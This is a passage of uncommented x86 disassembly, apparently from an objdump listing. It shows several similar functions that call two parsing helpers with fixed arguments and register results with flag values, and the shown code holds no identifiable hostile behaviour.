  40633b:	53                   	push   %ebx
  40633c:	68 90 39 42 00       	push   $0x423990
  406341:	e8 25 f5 ff ff       	call   0x40586b
  406346:	83 c4 0c             	add    $0xc,%esp
  406349:	85 c0                	test   %eax,%eax
  40634b:	0f 84 d3 00 00 00    	je     0x406424
  406351:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406354:	51                   	push   %ecx
  406355:	57                   	push   %edi
  406356:	53                   	push   %ebx
  406357:	68 00 f0 41 00       	push   $0x41f000
  40635c:	50                   	push   %eax
  40635d:	e8 99 f5 ff ff       	call   0x4058fb
  406362:	83 c4 14             	add    $0x14,%esp
  406365:	85 c0                	test   %eax,%eax
  406367:	0f 84 b7 00 00 00    	je     0x406424
  40636d:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406370:	51                   	push   %ecx
  406371:	57                   	push   %edi
  406372:	53                   	push   %ebx
  406373:	68 50 3e 42 00       	push   $0x423e50
  406378:	50                   	push   %eax
  406379:	e8 7d f5 ff ff       	call   0x4058fb
  40637e:	83 c4 14             	add    $0x14,%esp
  406381:	85 c0                	test   %eax,%eax
  406383:	0f 84 9b 00 00 00    	je     0x406424
  406389:	68 e4 50 41 00       	push   $0x4150e4
  40638e:	53                   	push   %ebx
  40638f:	68 80 3d 42 00       	push   $0x423d80
  406394:	e8 d2 f4 ff ff       	call   0x40586b
  406399:	83 c4 0c             	add    $0xc,%esp
  40639c:	85 c0                	test   %eax,%eax
  40639e:	0f 84 80 00 00 00    	je     0x406424
  4063a4:	68 94 9f 41 00       	push   $0x419f94
  4063a9:	53                   	push   %ebx
  4063aa:	68 60 37 42 00       	push   $0x423760
  4063af:	e8 b7 f4 ff ff       	call   0x40586b
  4063b4:	83 c4 0c             	add    $0xc,%esp
  4063b7:	85 c0                	test   %eax,%eax
  4063b9:	74 69                	je     0x406424
  4063bb:	68 e0 fd 41 00       	push   $0x41fde0
  4063c0:	57                   	push   %edi
  4063c1:	53                   	push   %ebx
  4063c2:	68 80 3c 42 00       	push   $0x423c80
  4063c7:	50                   	push   %eax
  4063c8:	e8 2e f5 ff ff       	call   0x4058fb
  4063cd:	83 c4 14             	add    $0x14,%esp
  4063d0:	85 c0                	test   %eax,%eax
  4063d2:	74 50                	je     0x406424
  4063d4:	68 54 f5 41 00       	push   $0x41f554
  4063d9:	57                   	push   %edi
  4063da:	53                   	push   %ebx
  4063db:	68 d4 3d 42 00       	push   $0x423dd4
  4063e0:	50                   	push   %eax
  4063e1:	e8 15 f5 ff ff       	call   0x4058fb
  4063e6:	83 c4 14             	add    $0x14,%esp
  4063e9:	85 c0                	test   %eax,%eax
  4063eb:	74 37                	je     0x406424
  4063ed:	68 d4 f5 41 00       	push   $0x41f5d4
  4063f2:	53                   	push   %ebx
  4063f3:	68 e8 4c 41 00       	push   $0x414ce8
  4063f8:	e8 6e f4 ff ff       	call   0x40586b
  4063fd:	83 c4 0c             	add    $0xc,%esp
  406400:	85 c0                	test   %eax,%eax
  406402:	75 06                	jne    0x40640a
  406404:	21 05 d4 f5 41 00    	and    %eax,0x41f5d4
  40640a:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40640d:	68 32 2c 40 00       	push   $0x402c32
  406412:	ff 75 f4             	push   -0xc(%ebp)
  406415:	6a 40                	push   $0x40
  406417:	e8 66 05 00 00       	call   0x406982
  40641c:	83 c4 0c             	add    $0xc,%esp
  40641f:	6a 40                	push   $0x40
  406421:	58                   	pop    %eax
  406422:	eb 02                	jmp    0x406426
  406424:	33 c0                	xor    %eax,%eax
  406426:	5f                   	pop    %edi
  406427:	5e                   	pop    %esi
  406428:	5b                   	pop    %ebx
  406429:	c9                   	leave
  40642a:	c3                   	ret
  40642b:	55                   	push   %ebp
  40642c:	8b ec                	mov    %esp,%ebp
  40642e:	83 ec 34             	sub    $0x34,%esp
  406431:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406435:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406439:	53                   	push   %ebx
  40643a:	56                   	push   %esi
  40643b:	57                   	push   %edi
  40643c:	8b f0                	mov    %eax,%esi
  40643e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406441:	50                   	push   %eax
  406442:	6a 22                	push   $0x22
  406444:	6a 5e                	push   $0x5e
  406446:	5b                   	pop    %ebx
  406447:	53                   	push   %ebx
  406448:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40644b:	50                   	push   %eax
  40644c:	83 c6 12             	add    $0x12,%esi
  40644f:	56                   	push   %esi
  406450:	c7 45 f4 07 00 00 00 	movl   $0x7,-0xc(%ebp)
  406457:	e8 9f f4 ff ff       	call   0x4058fb
  40645c:	83 c4 14             	add    $0x14,%esp
  40645f:	85 c0                	test   %eax,%eax
  406461:	74 25                	je     0x406488
  406463:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  406467:	75 1f                	jne    0x406488
  406469:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40646c:	85 c0                	test   %eax,%eax
  40646e:	74 18                	je     0x406488
  406470:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406473:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406476:	83 f8 09             	cmp    $0x9,%eax
  406479:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40647c:	76 0a                	jbe    0x406488
  40647e:	6a 0a                	push   $0xa
  406480:	33 d2                	xor    %edx,%edx
  406482:	59                   	pop    %ecx
  406483:	f7 f1                	div    %ecx
  406485:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406488:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40648b:	50                   	push   %eax
  40648c:	53                   	push   %ebx
  40648d:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406490:	50                   	push   %eax
  406491:	6a 27                	push   $0x27
  406493:	5f                   	pop    %edi
  406494:	8b c6                	mov    %esi,%eax
  406496:	e8 d0 f3 ff ff       	call   0x40586b
  40649b:	83 c4 0c             	add    $0xc,%esp
  40649e:	85 c0                	test   %eax,%eax
  4064a0:	0f 84 f9 00 00 00    	je     0x40659f
  4064a6:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  4064aa:	0f 85 ef 00 00 00    	jne    0x40659f
  4064b0:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4064b3:	68 e0 39 42 00       	push   $0x4239e0
  4064b8:	53                   	push   %ebx
  4064b9:	68 18 3a 42 00       	push   $0x423a18
  4064be:	89 0d ec 05 42 00    	mov    %ecx,0x4205ec
  4064c4:	e8 a2 f3 ff ff       	call   0x40586b
  4064c9:	83 c4 0c             	add    $0xc,%esp
  4064cc:	85 c0                	test   %eax,%eax
  4064ce:	0f 84 cb 00 00 00    	je     0x40659f
  4064d4:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4064d7:	51                   	push   %ecx
  4064d8:	57                   	push   %edi
  4064d9:	53                   	push   %ebx
  4064da:	68 58 f5 41 00       	push   $0x41f558
  4064df:	50                   	push   %eax
  4064e0:	e8 16 f4 ff ff       	call   0x4058fb
  4064e5:	83 c4 14             	add    $0x14,%esp
  4064e8:	85 c0                	test   %eax,%eax
  4064ea:	0f 84 af 00 00 00    	je     0x40659f
  4064f0:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4064f3:	51                   	push   %ecx
  4064f4:	53                   	push   %ebx
  4064f5:	68 80 30 42 00       	push   $0x423080
  4064fa:	e8 6c f3 ff ff       	call   0x40586b
  4064ff:	83 c4 0c             	add    $0xc,%esp
  406502:	85 c0                	test   %eax,%eax
  406504:	0f 84 95 00 00 00    	je     0x40659f
  40650a:	68 e4 fd 41 00       	push   $0x41fde4
  40650f:	53                   	push   %ebx
  406510:	68 88 4d 41 00       	push   $0x414d88
  406515:	e8 51 f3 ff ff       	call   0x40586b
  40651a:	83 c4 0c             	add    $0xc,%esp
  40651d:	85 c0                	test   %eax,%eax
  40651f:	74 7e                	je     0x40659f
  406521:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406524:	51                   	push   %ecx
  406525:	57                   	push   %edi
  406526:	53                   	push   %ebx
  406527:	68 e0 f1 41 00       	push   $0x41f1e0
  40652c:	50                   	push   %eax
  40652d:	e8 c9 f3 ff ff       	call   0x4058fb
  406532:	83 c4 14             	add    $0x14,%esp
  406535:	85 c0                	test   %eax,%eax
  406537:	74 66                	je     0x40659f
  406539:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40653c:	51                   	push   %ecx
  40653d:	57                   	push   %edi
  40653e:	53                   	push   %ebx
  40653f:	68 68 50 41 00       	push   $0x415068
  406544:	50                   	push   %eax
  406545:	e8 b1 f3 ff ff       	call   0x4058fb
  40654a:	83 c4 14             	add    $0x14,%esp
  40654d:	85 c0                	test   %eax,%eax
  40654f:	74 4e                	je     0x40659f
  406551:	68 e4 39 42 00       	push   $0x4239e4
  406556:	53                   	push   %ebx
  406557:	68 00 3e 42 00       	push   $0x423e00
  40655c:	e8 0a f3 ff ff       	call   0x40586b
  406561:	83 c4 0c             	add    $0xc,%esp
  406564:	85 c0                	test   %eax,%eax
  406566:	74 37                	je     0x40659f
  406568:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40656b:	51                   	push   %ecx
  40656c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40656f:	53                   	push   %ebx
  406570:	51                   	push   %ecx
  406571:	e8 f5 f2 ff ff       	call   0x40586b
  406576:	8b 75 f8             	mov    -0x8(%ebp),%esi
  406579:	f7 d8                	neg    %eax
  40657b:	68 62 2c 40 00       	push   $0x402c62
  406580:	ff 75 f4             	push   -0xc(%ebp)
  406583:	1b c0                	sbb    %eax,%eax
  406585:	23 45 cc             	and    -0x34(%ebp),%eax
  406588:	bf 00 40 00 00       	mov    $0x4000,%edi
  40658d:	57                   	push   %edi
  40658e:	a3 04 32 41 00       	mov    %eax,0x413204
  406593:	e8 ea 03 00 00       	call   0x406982
  406598:	83 c4 18             	add    $0x18,%esp
  40659b:	8b c7                	mov    %edi,%eax
  40659d:	eb 02                	jmp    0x4065a1
  40659f:	33 c0                	xor    %eax,%eax
  4065a1:	5f                   	pop    %edi
  4065a2:	5e                   	pop    %esi
  4065a3:	5b                   	pop    %ebx
  4065a4:	c9                   	leave
  4065a5:	c3                   	ret
  4065a6:	55                   	push   %ebp
  4065a7:	8b ec                	mov    %esp,%ebp
  4065a9:	83 ec 34             	sub    $0x34,%esp
  4065ac:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4065b0:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4065b4:	53                   	push   %ebx
  4065b5:	56                   	push   %esi
  4065b6:	57                   	push   %edi
  4065b7:	8b f0                	mov    %eax,%esi
  4065b9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4065bc:	50                   	push   %eax
  4065bd:	6a 22                	push   $0x22
  4065bf:	6a 5e                	push   $0x5e
  4065c1:	5b                   	pop    %ebx
  4065c2:	53                   	push   %ebx
  4065c3:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4065c6:	50                   	push   %eax
  4065c7:	83 c6 14             	add    $0x14,%esi
  4065ca:	56                   	push   %esi
  4065cb:	c7 45 f4 05 00 00 00 	movl   $0x5,-0xc(%ebp)
  4065d2:	e8 24 f3 ff ff       	call   0x4058fb
  4065d7:	83 c4 14             	add    $0x14,%esp
  4065da:	85 c0                	test   %eax,%eax
  4065dc:	74 25                	je     0x406603
  4065de:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  4065e2:	75 1f                	jne    0x406603
  4065e4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4065e7:	85 c0                	test   %eax,%eax
  4065e9:	74 18                	je     0x406603
  4065eb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4065ee:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4065f1:	83 f8 09             	cmp    $0x9,%eax
  4065f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4065f7:	76 0a                	jbe    0x406603
  4065f9:	6a 0a                	push   $0xa
  4065fb:	33 d2                	xor    %edx,%edx
  4065fd:	59                   	pop    %ecx
  4065fe:	f7 f1                	div    %ecx
  406600:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406603:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406606:	50                   	push   %eax
  406607:	53                   	push   %ebx
  406608:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40660b:	50                   	push   %eax
  40660c:	6a 27                	push   $0x27
  40660e:	5f                   	pop    %edi
  40660f:	8b c6                	mov    %esi,%eax
  406611:	e8 55 f2 ff ff       	call   0x40586b
  406616:	83 c4 0c             	add    $0xc,%esp
  406619:	85 c0                	test   %eax,%eax
  40661b:	0f 84 90 01 00 00    	je     0x4067b1
  406621:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  406625:	0f 85 86 01 00 00    	jne    0x4067b1
  40662b:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40662e:	68 a8 f5 41 00       	push   $0x41f5a8
  406633:	53                   	push   %ebx
  406634:	68 98 79 41 00       	push   $0x417998
  406639:	89 0d 7c 52 41 00    	mov    %ecx,0x41527c
  40663f:	e8 27 f2 ff ff       	call   0x40586b
  406644:	83 c4 0c             	add    $0xc,%esp
  406647:	85 c0                	test   %eax,%eax
  406649:	0f 84 62 01 00 00    	je     0x4067b1
  40664f:	68 8c 9f 41 00       	push   $0x419f8c
  406654:	53                   	push   %ebx
  406655:	68 c0 71 41 00       	push   $0x4171c0
  40665a:	e8 0c f2 ff ff       	call   0x40586b
  40665f:	83 c4 0c             	add    $0xc,%esp
  406662:	85 c0                	test   %eax,%eax
  406664:	0f 84 47 01 00 00    	je     0x4067b1
  40666a:	68 fc 3d 42 00       	push   $0x423dfc
  40666f:	53                   	push   %ebx
  406670:	68 28 3d 42 00       	push   $0x423d28
  406675:	e8 f1 f1 ff ff       	call   0x40586b
  40667a:	83 c4 0c             	add    $0xc,%esp
  40667d:	85 c0                	test   %eax,%eax
  40667f:	0f 84 2c 01 00 00    	je     0x4067b1
  406685:	68 30 50 41 00       	push   $0x415030
  40668a:	53                   	push   %ebx
  40668b:	68 08 32 41 00       	push   $0x413208
  406690:	e8 d6 f1 ff ff       	call   0x40586b
  406695:	83 c4 0c             	add    $0xc,%esp
  406698:	85 c0                	test   %eax,%eax
  40669a:	0f 84 11 01 00 00    	je     0x4067b1
  4066a0:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4066a3:	51                   	push   %ecx
  4066a4:	57                   	push   %edi
  4066a5:	53                   	push   %ebx
  4066a6:	68 d0 3c 42 00       	push   $0x423cd0
  4066ab:	50                   	push   %eax
  4066ac:	e8 4a f2 ff ff       	call   0x4058fb
  4066b1:	83 c4 14             	add    $0x14,%esp
  4066b4:	85 c0                	test   %eax,%eax
  4066b6:	0f 84 f5 00 00 00    	je     0x4067b1
  4066bc:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4066bf:	51                   	push   %ecx
  4066c0:	57                   	push   %edi
  4066c1:	53                   	push   %ebx
  4066c2:	68 38 4d 41 00       	push   $0x414d38
  4066c7:	50                   	push   %eax
  4066c8:	e8 2e f2 ff ff       	call   0x4058fb
  4066cd:	83 c4 14             	add    $0x14,%esp
  4066d0:	85 c0                	test   %eax,%eax
  4066d2:	0f 84 d9 00 00 00    	je     0x4067b1
  4066d8:	68 10 3a 42 00       	push   $0x423a10
  4066dd:	53                   	push   %ebx
  4066de:	68 50 a4 41 00       	push   $0x41a450
  4066e3:	e8 83 f1 ff ff       	call   0x40586b
  4066e8:	83 c4 0c             	add    $0xc,%esp
  4066eb:	85 c0                	test   %eax,%eax
  4066ed:	0f 84 be 00 00 00    	je     0x4067b1
  4066f3:	68 4c a4 41 00       	push   $0x41a44c
  4066f8:	53                   	push   %ebx
  4066f9:	68 28 9f 41 00       	push   $0x419f28
  4066fe:	e8 68 f1 ff ff       	call   0x40586b
  406703:	83 c4 0c             	add    $0xc,%esp
  406706:	85 c0                	test   %eax,%eax
  406708:	0f 84 a3 00 00 00    	je     0x4067b1
  40670e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406711:	51                   	push   %ecx
  406712:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406715:	53                   	push   %ebx
  406716:	51                   	push   %ecx
  406717:	e8 4f f1 ff ff       	call   0x40586b
  40671c:	83 c4 0c             	add    $0xc,%esp
  40671f:	85 c0                	test   %eax,%eax
  406721:	0f 84 8a 00 00 00    	je     0x4067b1
  406727:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  40672b:	0f 85 80 00 00 00    	jne    0x4067b1
  406731:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  406734:	89 0d 18 9f 41 00    	mov    %ecx,0x419f18
  40673a:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40673d:	51                   	push   %ecx
  40673e:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406741:	53                   	push   %ebx
  406742:	51                   	push   %ecx
  406743:	e8 23 f1 ff ff       	call   0x40586b
  406748:	83 c4 0c             	add    $0xc,%esp
  40674b:	85 c0                	test   %eax,%eax
  40674d:	74 62                	je     0x4067b1
  40674f:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  406753:	75 5c                	jne    0x4067b1
  406755:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  406758:	68 54 f5 41 00       	push   $0x41f554
  40675d:	57                   	push   %edi
  40675e:	53                   	push   %ebx
  40675f:	68 d4 3d 42 00       	push   $0x423dd4
  406764:	50                   	push   %eax
  406765:	89 0d 70 76 41 00    	mov    %ecx,0x417670
  40676b:	e8 8b f1 ff ff       	call   0x4058fb
  406770:	83 c4 14             	add    $0x14,%esp
  406773:	85 c0                	test   %eax,%eax
  406775:	74 3a                	je     0x4067b1
  406777:	68 d4 f5 41 00       	push   $0x41f5d4
  40677c:	53                   	push   %ebx
  40677d:	68 e8 4c 41 00       	push   $0x414ce8
  406782:	e8 e4 f0 ff ff       	call   0x40586b
  406787:	83 c4 0c             	add    $0xc,%esp
  40678a:	85 c0                	test   %eax,%eax
  40678c:	75 06                	jne    0x406794
  40678e:	21 05 d4 f5 41 00    	and    %eax,0x41f5d4
  406794:	8b 75 f8             	mov    -0x8(%ebp),%esi
  406797:	68 0e 2d 40 00       	push   $0x402d0e
  40679c:	ff 75 f4             	push   -0xc(%ebp)
  40679f:	bf 80 00 00 00       	mov    $0x80,%edi
  4067a4:	57                   	push   %edi
  4067a5:	e8 d8 01 00 00       	call   0x406982
  4067aa:	83 c4 0c             	add    $0xc,%esp
  4067ad:	8b c7                	mov    %edi,%eax
  4067af:	eb 02                	jmp    0x4067b3
  4067b1:	33 c0                	xor    %eax,%eax
  4067b3:	5f                   	pop    %edi
  4067b4:	5e                   	pop    %esi
  4067b5:	5b                   	pop    %ebx
  4067b6:	c9                   	leave
  4067b7:	c3                   	ret
  4067b8:	55                   	push   %ebp
  4067b9:	8d 6c 24 8c          	lea    -0x74(%esp),%ebp
  4067bd:	81 ec cc 00 00 00    	sub    $0xcc,%esp
  4067c3:	83 65 70 00          	andl   $0x0,0x70(%ebp)
  4067c7:	57                   	push   %edi
  4067c8:	8d 45 70             	lea    0x70(%ebp),%eax
  4067cb:	50                   	push   %eax
  4067cc:	6a 5e                	push   $0x5e
  4067ce:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4067d1:	50                   	push   %eax
  4067d2:	8b 45 7c             	mov    0x7c(%ebp),%eax
  4067d5:	6a 27                	push   $0x27
  4067d7:	83 c0 0c             	add    $0xc,%eax
  4067da:	5f                   	pop    %edi
  4067db:	e8 8b f0 ff ff       	call   0x40586b
  4067e0:	83 c4 0c             	add    $0xc,%esp
  4067e3:	85 c0                	test   %eax,%eax
  4067e5:	74 4a                	je     0x406831
  4067e7:	83 7d 70 01          	cmpl   $0x1,0x70(%ebp)
  4067eb:	75 44                	jne    0x406831
  4067ed:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4067f0:	89 0d d0 3d 42 00    	mov    %ecx,0x423dd0
  4067f6:	8d 4d 70             	lea    0x70(%ebp),%ecx
  4067f9:	51                   	push   %ecx
  4067fa:	57                   	push   %edi
  4067fb:	6a 5e                	push   $0x5e
  4067fd:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  406800:	51                   	push   %ecx
  406801:	50                   	push   %eax
  406802:	e8 f4 f0 ff ff       	call   0x4058fb
  406807:	83 c4 14             	add    $0x14,%esp
  40680a:	85 c0                	test   %eax,%eax
  40680c:	74 23                	je     0x406831
  40680e:	83 7d 70 03          	cmpl   $0x3,0x70(%ebp)
  406812:	7c 1d                	jl     0x406831
  406814:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406817:	a3 60 50 41 00       	mov    %eax,0x415060
  40681c:	8b 45 ac             	mov    -0x54(%ebp),%eax
  40681f:	a3 38 08 42 00       	mov    %eax,0x420838
  406824:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406827:	6a 08                	push   $0x8
  406829:	a3 a4 06 42 00       	mov    %eax,0x4206a4
  40682e:	58                   	pop    %eax
  40682f:	eb 02                	jmp    0x406833
  406831:	33 c0                	xor    %eax,%eax
  406833:	5f                   	pop    %edi
  406834:	83 c5 74             	add    $0x74,%ebp
  406837:	c9                   	leave
  406838:	c3                   	ret
  406839:	55                   	push   %ebp
  40683a:	8b ec                	mov    %esp,%ebp
  40683c:	83 ec 20             	sub    $0x20,%esp
  40683f:	53                   	push   %ebx
  406840:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406844:	56                   	push   %esi
  406845:	57                   	push   %edi
  406846:	6a 0a                	push   $0xa
  406848:	5f                   	pop    %edi
  406849:	8b d8                	mov    %eax,%ebx
  40684b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40684e:	50                   	push   %eax
  40684f:	6a 22                	push   $0x22
  406851:	6a 5e                	push   $0x5e
  406853:	5e                   	pop    %esi
  406854:	56                   	push   %esi
  406855:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406858:	50                   	push   %eax
  406859:	83 c3 0e             	add    $0xe,%ebx
  40685c:	53                   	push   %ebx
  40685d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  406860:	e8 96 f0 ff ff       	call   0x4058fb
  406865:	8b c8                	mov    %eax,%ecx
  406867:	83 c4 14             	add    $0x14,%esp
  40686a:	85 c9                	test   %ecx,%ecx
  40686c:	74 24                	je     0x406892
  40686e:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  406872:	75 1e                	jne    0x406892
  406874:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406877:	85 c0                	test   %eax,%eax
  406879:	74 17                	je     0x406892
  40687b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40687e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406881:	83 f8 09             	cmp    $0x9,%eax
  406884:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406887:	76 07                	jbe    0x406890
  406889:	33 d2                	xor    %edx,%edx
  40688b:	f7 f7                	div    %edi
  40688d:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406890:	8b d9                	mov    %ecx,%ebx
  406892:	68 1c 9f 41 00       	push   $0x419f1c
  406897:	56                   	push   %esi
  406898:	68 e8 39 42 00       	push   $0x4239e8
  40689d:	6a 27                	push   $0x27
  40689f:	5f                   	pop    %edi
  4068a0:	8b c3                	mov    %ebx,%eax
  4068a2:	e8 c4 ef ff ff       	call   0x40586b
  4068a7:	83 c4 0c             	add    $0xc,%esp
  4068aa:	85 c0                	test   %eax,%eax
  4068ac:	75 07                	jne    0x4068b5
  4068ae:	33 c0                	xor    %eax,%eax
  4068b0:	e9 8b 00 00 00       	jmp    0x406940
  4068b5:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4068b8:	51                   	push   %ecx
  4068b9:	56                   	push   %esi
  4068ba:	68 e8 36 42 00       	push   $0x4236e8
  4068bf:	e8 a7 ef ff ff       	call   0x40586b
  4068c4:	83 c4 0c             	add    $0xc,%esp
  4068c7:	85 c0                	test   %eax,%eax
  4068c9:	74 e3                	je     0x4068ae
  4068cb:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4068ce:	51                   	push   %ecx
  4068cf:	56                   	push   %esi
  4068d0:	68 b8 50 41 00       	push   $0x4150b8
  4068d5:	e8 91 ef ff ff       	call   0x40586b
  4068da:	83 c4 0c             	add    $0xc,%esp
  4068dd:	85 c0                	test   %eax,%eax
  4068df:	74 cd                	je     0x4068ae
  4068e1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4068e4:	51                   	push   %ecx
  4068e5:	56                   	push   %esi
  4068e6:	68 38 50 41 00       	push   $0x415038
  4068eb:	e8 7b ef ff ff       	call   0x40586b
  4068f0:	83 c4 0c             	add    $0xc,%esp
  4068f3:	85 c0                	test   %eax,%eax
  4068f5:	74 b7                	je     0x4068ae
  4068f7:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4068fa:	51                   	push   %ecx
  4068fb:	57                   	push   %edi
  4068fc:	56                   	push   %esi
  4068fd:	68 40 28 42 00       	push   $0x422840
  406902:	50                   	push   %eax
  406903:	e8 f3 ef ff ff       	call   0x4058fb
  406908:	83 c4 14             	add    $0x14,%esp
  40690b:	85 c0                	test   %eax,%eax
  40690d:	74 9f                	je     0x4068ae
  40690f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406912:	51                   	push   %ecx
  406913:	56                   	push   %esi
  406914:	68 30 35 42 00       	push   $0x423530
  406919:	e8 4d ef ff ff       	call   0x40586b
  40691e:	83 c4 0c             	add    $0xc,%esp
  406921:	85 c0                	test   %eax,%eax
  406923:	74 89                	je     0x4068ae
  406925:	8b 75 f8             	mov    -0x8(%ebp),%esi
  406928:	68 3e 2e 40 00       	push   $0x402e3e
  40692d:	ff 75 f4             	push   -0xc(%ebp)
  406930:	bf 00 00 04 00       	mov    $0x40000,%edi
  406935:	57                   	push   %edi
  406936:	e8 47 00 00 00       	call   0x406982
  40693b:	83 c4 0c             	add    $0xc,%esp
  40693e:	8b c7                	mov    %edi,%eax
  406940:	5f                   	pop    %edi
  406941:	5e                   	pop    %esi
  406942:	5b                   	pop    %ebx
  406943:	c9                   	leave
  406944:	c3                   	ret
  406945:	68 64 50 41 00       	push   $0x415064
  40694a:	6a 27                	push   $0x27
  40694c:	6a 5e                	push   $0x5e
  40694e:	83 c0 12             	add    $0x12,%eax
  406951:	68 b4 fd 41 00       	push   $0x41fdb4
  406956:	50                   	push   %eax
  406957:	e8 9f ef ff ff       	call   0x4058fb
  40695c:	83 c4 14             	add    $0x14,%esp
  40695f:	85 c0                	test   %eax,%eax
  406961:	75 01                	jne    0x406964
  406963:	c3                   	ret
  406964:	56                   	push   %esi
  406965:	68 87 32 40 00       	push   $0x403287
  40696a:	6a 0b                	push   $0xb
  40696c:	68 00 00 08 00       	push   $0x80000
  406971:	33 f6                	xor    %esi,%esi
  406973:	e8 0a 00 00 00       	call   0x406982
  406978:	83 c4 0c             	add    $0xc,%esp
  40697b:	b8 00 00 08 00       	mov    $0x80000,%eax
  406980:	5e                   	pop    %esi
  406981:	c3                   	ret
  406982:	8b ce                	mov    %esi,%ecx
  406984:	69 c9 44 01 00 00    	imul   $0x144,%ecx,%ecx
  40698a:	8d 81 10 a6 41 00    	lea    0x41a610(%ecx),%eax
  406990:	8b 10                	mov    (%eax),%edx
  406992:	c1 e2 04             	shl    $0x4,%edx
  406995:	03 ca                	add    %edx,%ecx
  406997:	8b 54 24 04          	mov    0x4(%esp),%edx
  40699b:	89 91 d0 a4 41 00    	mov    %edx,0x41a4d0(%ecx)
  4069a1:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4069a5:	89 91 dc a4 41 00    	mov    %edx,0x41a4dc(%ecx)
  4069ab:	8b 54 24 08          	mov    0x8(%esp),%edx
  4069af:	89 91 d4 a4 41 00    	mov    %edx,0x41a4d4(%ecx)
  4069b5:	89 b1 d8 a4 41 00    	mov    %esi,0x41a4d8(%ecx)
  4069bb:	ff 00                	incl   (%eax)
  4069bd:	8b 00                	mov    (%eax),%eax
  4069bf:	c3                   	ret
  4069c0:	55                   	push   %ebp
  4069c1:	8b ec                	mov    %esp,%ebp
  4069c3:	51                   	push   %ecx
  4069c4:	51                   	push   %ecx
  4069c5:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4069c9:	57                   	push   %edi
  4069ca:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4069cd:	50                   	push   %eax
  4069ce:	ff 75 0c             	push   0xc(%ebp)
  4069d1:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4069d4:	50                   	push   %eax
  4069d5:	6a 00                	push   $0x0
  4069d7:	ff 75 08             	push   0x8(%ebp)
  4069da:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  4069e1:	ff 36                	push   (%esi)
  4069e3:	ff 15 08 e0 40 00    	call   *0x40e008
  4069e9:	ff 36                	push   (%esi)
  4069eb:	8b f8                	mov    %eax,%edi
  4069ed:	ff 15 14 e0 40 00    	call   *0x40e014
  4069f3:	33 c0                	xor    %eax,%eax
  4069f5:	85 ff                	test   %edi,%edi
  4069f7:	0f 94 c0             	sete   %al
  4069fa:	5f                   	pop    %edi
  4069fb:	c9                   	leave
  4069fc:	c3                   	ret
  4069fd:	55                   	push   %ebp
  4069fe:	8b ec                	mov    %esp,%ebp
  406a00:	51                   	push   %ecx
  406a01:	51                   	push   %ecx
  406a02:	56                   	push   %esi
  406a03:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406a06:	50                   	push   %eax
  406a07:	33 f6                	xor    %esi,%esi
  406a09:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a0c:	50                   	push   %eax
  406a0d:	56                   	push   %esi
